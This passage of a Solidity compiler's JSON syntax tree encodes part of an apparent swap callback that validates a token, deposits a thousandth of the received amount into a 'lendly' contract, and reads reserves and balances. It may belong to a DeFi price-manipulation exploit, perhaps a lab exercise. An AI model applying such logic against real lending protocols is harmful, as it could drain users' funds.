                          "typeString": "contract IERC20"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 206,
                  "initialValue": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 200,
                            "name": "data",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 170,
                            "src": "2193:4:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_bytes_calldata_ptr",
                              "typeString": "bytes calldata"
                            }
                          },
                          {
                            "components": [
                              {
                                "id": 202,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "2200:7:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 201,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "2200:7:3",
                                  "typeDescriptions": {}
                                }
                              }
                            ],
                            "id": 203,
                            "isConstant": false,
                            "isInlineArray": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "nodeType": "TupleExpression",
                            "src": "2199:9:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_bytes_calldata_ptr",
                              "typeString": "bytes calldata"
                            },
                            {
                              "typeIdentifier": "t_type$_t_address_$",
                              "typeString": "type(address)"
                            }
                          ],
                          "expression": {
                            "id": 198,
                            "name": "abi",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -1,
                            "src": "2182:3:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_abi",
                              "typeString": "abi"
                            }
                          },
                          "id": 199,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "memberName": "decode",
                          "nodeType": "MemberAccess",
                          "src": "2182:10:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_abidecode_pure$__$returns$__$",
                            "typeString": "function () pure"
                          }
                        },
                        "id": 204,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2182:27:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 197,
                      "name": "IERC20",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 564,
                      "src": "2175:6:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_contract$_IERC20_$564_$",
                        "typeString": "type(contract IERC20)"
                      }
                    },
                    "id": 205,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2175:35:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$564",
                      "typeString": "contract IERC20"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2160:50:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        "id": 214,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "commonType": {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          },
                          "id": 210,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 208,
                            "name": "token",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 196,
                            "src": "2228:5:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "==",
                          "rightExpression": {
                            "id": 209,
                            "name": "token0",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 33,
                            "src": "2237:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "src": "2228:15:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "||",
                        "rightExpression": {
                          "commonType": {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          },
                          "id": 213,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 211,
                            "name": "token",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 196,
                            "src": "2247:5:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "==",
                          "rightExpression": {
                            "id": 212,
                            "name": "token1",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "2256:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "src": "2247:15:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "src": "2228:34:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "77726f6e6720746f6b656e",
                        "id": 215,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2264:13:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_61e7d7045f1ed599b6f72c0afd4915011182b10cf8137b9a16f02327d0437ffc",
                          "typeString": "literal_string \"wrong token\""
                        },
                        "value": "wrong token"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_61e7d7045f1ed599b6f72c0afd4915011182b10cf8137b9a16f02327d0437ffc",
                          "typeString": "literal_string \"wrong token\""
                        }
                      ],
                      "id": 207,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "2220:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 216,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2220:58:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 217,
                  "nodeType": "ExpressionStatement",
                  "src": "2220:58:3"
                },
                {
                  "assignments": [
                    219
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 219,
                      "mutability": "mutable",
                      "name": "amount",
                      "nameLocation": "2297:6:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "2289:14:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 218,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "2289:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 226,
                  "initialValue": {
                    "condition": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 222,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 220,
                        "name": "amount0",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 166,
                        "src": "2306:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "==",
                      "rightExpression": {
                        "hexValue": "30",
                        "id": 221,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2317:1:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      "src": "2306:12:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bool",
                        "typeString": "bool"
                      }
                    },
                    "falseExpression": {
                      "id": 224,
                      "name": "amount0",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 166,
                      "src": "2331:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "id": 225,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "nodeType": "Conditional",
                    "src": "2306:32:3",
                    "trueExpression": {
                      "id": 223,
                      "name": "amount1",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 168,
                      "src": "2321:7:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2289:49:3"
                },
                {
                  "assignments": [
                    228
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 228,
                      "mutability": "mutable",
                      "name": "depositAmount",
                      "nameLocation": "2395:13:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "2387:21:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 227,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "2387:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 234,
                  "initialValue": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 233,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "commonType": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "id": 231,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "leftExpression": {
                        "id": 229,
                        "name": "amount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 219,
                        "src": "2411:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "*",
                      "rightExpression": {
                        "hexValue": "31",
                        "id": 230,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "2420:1:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1_by_1",
                          "typeString": "int_const 1"
                        },
                        "value": "1"
                      },
                      "src": "2411:10:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "/",
                    "rightExpression": {
                      "hexValue": "31303030",
                      "id": 232,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "2424:4:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_1000_by_1",
                        "typeString": "int_const 1000"
                      },
                      "value": "1000"
                    },
                    "src": "2411:17:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2387:41:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 240,
                            "name": "lendly",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 27,
                            "src": "2460:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_ILendly_$21",
                              "typeString": "contract ILendly"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_ILendly_$21",
                              "typeString": "contract ILendly"
                            }
                          ],
                          "id": 239,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2452:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 238,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2452:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 241,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2452:15:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 242,
                        "name": "depositAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 228,
                        "src": "2469:13:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 235,
                        "name": "token",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 196,
                        "src": "2438:5:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
                          "typeString": "contract IERC20"
                        }
                      },
                      "id": 237,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "approve",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 551,
                      "src": "2438:13:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
                        "typeString": "function (address,uint256) external returns (bool)"
                      }
                    },
                    "id": 243,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2438:45:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 244,
                  "nodeType": "ExpressionStatement",
                  "src": "2438:45:3"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 250,
                            "name": "token",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 196,
                            "src": "2516:5:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          ],
                          "id": 249,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2508:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 248,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2508:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 251,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2508:14:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 252,
                        "name": "depositAmount",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 228,
                        "src": "2524:13:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "id": 245,
                        "name": "lendly",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 27,
                        "src": "2493:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_ILendly_$21",
                          "typeString": "contract ILendly"
                        }
                      },
                      "id": 247,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "deposit",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 13,
                      "src": "2493:14:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,uint256) external"
                      }
                    },
                    "id": 253,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "2493:45:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 254,
                  "nodeType": "ExpressionStatement",
                  "src": "2493:45:3"
                },
                {
                  "assignments": [
                    257
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 257,
                      "mutability": "mutable",
                      "name": "otherToken",
                      "nameLocation": "2597:10:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "2590:17:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      },
                      "typeName": {
                        "id": 256,
                        "nodeType": "UserDefinedTypeName",
                        "pathNode": {
                          "id": 255,
                          "name": "IERC20",
                          "nodeType": "IdentifierPath",
                          "referencedDeclaration": 564,
                          "src": "2590:6:3"
                        },
                        "referencedDeclaration": 564,
                        "src": "2590:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IERC20_$564",
                          "typeString": "contract IERC20"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 258,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2590:17:3"
                },
                {
                  "assignments": [
                    260
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 260,
                      "mutability": "mutable",
                      "name": "otherTokenReserve",
                      "nameLocation": "2625:17:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 339,
                      "src": "2617:25:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 259,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "2617:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 261,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "2617:25:3"
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_contract$_IERC20_$564",
                      "typeString": "contract IERC20"
                    },
                    "id": 264,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 262,
                      "name": "token",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 196,
                      "src": "2655:5:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "id": 263,
                      "name": "token0",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 33,
                      "src": "2664:6:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      }
                    },
                    "src": "2655:15:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": {
                    "id": 282,
                    "nodeType": "Block",
                    "src": "2764:86:3",
                    "statements": [
                      {
                        "expression": {
                          "id": 276,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 274,
                            "name": "otherToken",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 257,
                            "src": "2778:10:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "id": 275,
                            "name": "token0",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 33,
                            "src": "2791:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "src": "2778:19:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          }
                        },
                        "id": 277,
                        "nodeType": "ExpressionStatement",
                        "src": "2778:19:3"
                      },
                      {
                        "expression": {
                          "id": 280,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 278,
                            "name": "otherTokenReserve",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 260,
                            "src": "2811:17:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "id": 279,
                            "name": "reserve0",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 38,
                            "src": "2831:8:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "2811:28:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 281,
                        "nodeType": "ExpressionStatement",
                        "src": "2811:28:3"
                      }
                    ]
                  },
                  "id": 283,
                  "nodeType": "IfStatement",
                  "src": "2652:198:3",
                  "trueBody": {
                    "id": 273,
                    "nodeType": "Block",
                    "src": "2672:86:3",
                    "statements": [
                      {
                        "expression": {
                          "id": 267,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 265,
                            "name": "otherToken",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 257,
                            "src": "2686:10:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "id": 266,
                            "name": "token1",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 36,
                            "src": "2699:6:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "src": "2686:19:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IERC20_$564",
                            "typeString": "contract IERC20"
                          }
                        },
                        "id": 268,
                        "nodeType": "ExpressionStatement",
                        "src": "2686:19:3"
                      },
                      {
                        "expression": {
                          "id": 271,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftHandSide": {
                            "id": 269,
                            "name": "otherTokenReserve",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 260,
                            "src": "2719:17:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "Assignment",
                          "operator": "=",
                          "rightHandSide": {
                            "id": 270,
                            "name": "reserve1",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 40,
                            "src": "2739:8:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "2719:28:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "id": 272,
                        "nodeType": "ExpressionStatement",
                        "src": "2719:28:3"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "id": 289,
                            "name": "otherToken",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 257,
                            "src": "2920:10:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          ],
                          "id": 288,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "2912:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 287,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "2912:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 290,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2912:19:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 295,
                                "name": "lendly",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 27,
                                "src": "2962:6:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_ILendly_$21",
                                  "typeString": "contract ILendly"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_ILendly_$21",
                                  "typeString": "contract ILendly"
                                }
                              ],
                              "id": 294,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "2954:7:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 293,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "2954:7:3",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 296,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "2954:15:3",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 291,
                            "name": "otherToken",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 257,
                            "src": "2933:10:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$564",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 292,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 521,
                          "src": "2933:20:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 297,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "2933:37:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
